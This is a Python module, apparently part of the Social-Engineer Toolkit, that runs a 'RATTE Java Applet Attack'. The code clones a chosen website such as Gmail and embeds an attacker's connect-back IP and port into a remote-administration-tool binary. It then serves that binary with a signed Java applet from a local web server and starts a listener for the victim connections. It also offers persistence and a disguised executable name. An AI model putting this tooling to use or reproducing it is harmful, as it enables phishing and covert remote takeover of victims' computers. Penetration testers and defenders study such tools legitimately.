import os
import subprocess
from time import sleep
try:
    from urllib.parse import urlparse
except ImportError:
    from urlparse import urlparse
try:
    import socketserver as SocketServer  # Py3
except ImportError:
    import SocketServer  # Py2
try:
    import http.server as SimpleHTTPServer  # Py3
except ImportError:
    import SimpleHTTPServer  # Py2
try:
    import _thread as thread  # Py3
except ImportError:
    import thread  # Py2
import src.core.setcore as core
from src.core.menu import text
try:
    input = raw_input
except NameError:
    pass
definepath = os.getcwd()
userconfigpath = core.userconfigpath
MAIN="RATTE Java Applet Attack (Remote Administration Tool Tommy Edition) - Read the readme/RATTE_README.txt first"
AUTHOR="Thomas Werth"
httpd = None
def start_web_server_tw(directory, port):
    global httpd
    try:
        class ReusableTCPServer(SocketServer.TCPServer):
            allow_reuse_address = True
        httpd = ReusableTCPServer(("0.0.0.0", port), SimpleHTTPServer.SimpleHTTPRequestHandler)
        thread.start_new_thread(httpd.serve_forever, ())
        os.chdir(directory)
    except KeyboardInterrupt:
        core.print_info("Exiting the SET web server...")
        httpd.socket.close()
def stop_web_server_tw():
    global httpd
    try:
        httpd.socket.close()
    except:
        httpd.socket.close()
def java_applet_attack_tw(website, port, directory, ipaddr):
    core.site_cloner(website, directory, "java")
    if os.path.isfile(os.path.join(userconfigpath, "rand_gen")):
        with open(os.path.join(userconfigpath, "rand_gen")) as fileopen:
            for line in fileopen:
                filename = line.rstrip()
                subprocess.Popen("cp src/payloads/ratte/ratte.binary %s/%s 1> /dev/null 2> /dev/null" % (directory, filename), shell=True).wait()
    subprocess.Popen("cp %s/Signed_Update.jar %s 1> /dev/null 2> /dev/null" % (userconfigpath, directory), shell=True).wait()
    with open(os.path.join(directory, "index.html"), "rb") as fileopen:
        data = fileopen.read()
    with open(os.path.join(directory, "index.html"), 'wb') as filewrite:
        to_replace = core.grab_ipaddress() + ":80"
        filewrite.write(data.replace(str(to_replace), ipaddr + ":" + str(port), 3))
    start_web_server_tw(directory, port)
def ratte_listener_start(port):
    subprocess.Popen("../src/payloads/ratte/ratteserver %d" % port, shell=True).wait()
def prepare_ratte(ipaddr, ratteport, persistent, customexe):
    core.print_status("preparing RATTE...")
    with open("src/payloads/ratte/ratte.binary", "rb") as fileopen:
        data = fileopen.read()
    with open(os.path.join(userconfigpath, "ratteM.exe"), 'wb') as filewrite:
        host = (len(ipaddr) + 1) * "X"
        r_port = (len(str(ratteport)) + 1) * "Y"
        pers = (len(str(persistent)) + 1) * "Z"
        if customexe:
            cexe = (len(str(customexe)) + 1) * "Q"
        else:
            cexe = ""
        filewrite.write(data.replace(cexe, customexe + "\x00", 1).replace(pers, persistent + "\x00", 1).replace(host, ipaddr + "\x00", 1).replace(r_port, str(ratteport) + "\x00", 1))
def main():
    valid_site = False
    valid_ip = False
    input_counter = 0
    site_input_counter = 0
    ipaddr = None
    website = None
    while not valid_site and site_input_counter < 3:
        website = input(core.setprompt(["9", "2"], "Enter website to clone (ex. https://gmail.com)"))
        site = urlparse(website)
        if site.scheme == "http" or site.scheme == "https":
            if site.netloc != "":
                valid_site = True
            else:
                if site_input_counter == 2:
                    core.print_error("\nMaybe you have the address written down wrong?" + core.bcolors.ENDC)
                    sleep(4)
                    return
                else:
                    core.print_warning("I can't determine the fqdn or IP of the site. Try again?")
                    site_input_counter += 1
        else:
            if site_input_counter == 2:
                core.print_error("\nMaybe you have the address written down wrong?")
                sleep(4)
                return
            else:
                core.print_warning("I couldn't determine whether this is an http or https site. Try again?")
                site_input_counter += 1
    while not valid_ip and input_counter < 3:
        ipaddr = input(core.setprompt(["9", "2"], "Enter the IP address to connect back on"))
        valid_ip = core.validate_ip(ipaddr)
        if not valid_ip:
            if input_counter == 2:
                core.print_error("\nMaybe you have the address written down wrong?")
                sleep(4)
                return
            else:
                input_counter += 1
    try:
        javaport = int(input(core.setprompt(["9", "2"], "Port Java applet should listen on [80]")))
        while javaport == 0 or javaport > 65535:
            if javaport == 0:
                core.print_warning(text.PORT_NOT_ZERO)
            if javaport > 65535:
                core.print_warning(text.PORT_TOO_HIGH)
            javaport = int(input(core.setprompt(["9", "2"], "Port Java applet should listen on [80]")))
    except ValueError:
        javaport = 80
    try:
        ratteport = int(input(core.setprompt(["9", "2"], "Port RATTE Server should listen on [8080]")))
        while ratteport == javaport or ratteport == 0 or ratteport > 65535:
            if ratteport == javaport:
                core.print_warning("Port must not be equal to javaport!")
            if ratteport == 0:
                core.print_warning(text.PORT_NOT_ZERO)
            if ratteport > 65535:
                core.print_warning(text.PORT_TOO_HIGH)
            ratteport = int(input(core.setprompt(["9", "2"], "Port RATTE Server should listen on [8080]")))
    except ValueError:
        ratteport = 8080
    persistent = core.yesno_prompt(["9", "2"], "Should RATTE be persistentententent [no|yes]?")
    customexe = input(core.setprompt(["9", "2"], "Use specifix filename (ex. firefox.exe) [filename.exe or empty]?"))
    prepare_ratte(ipaddr, ratteport, persistent, customexe)
    core.print_info("Starting java applet attack...")
    java_applet_attack_tw(website, javaport, "reports/", ipaddr)
    with open(os.path.join(userconfigpath, definepath, "/rand_gen")) as fileopen:
        for line in fileopen:
            ratte_random = line.rstrip()
        subprocess.Popen("cp %s/ratteM.exe %s/reports/%s" % (os.path.join(userconfigpath, definepath), definepath, ratte_random), shell=True).wait()
    core.print_info("Starting ratteserver...")
    ratte_listener_start(ratteport)
    stop_web_server_tw()
    return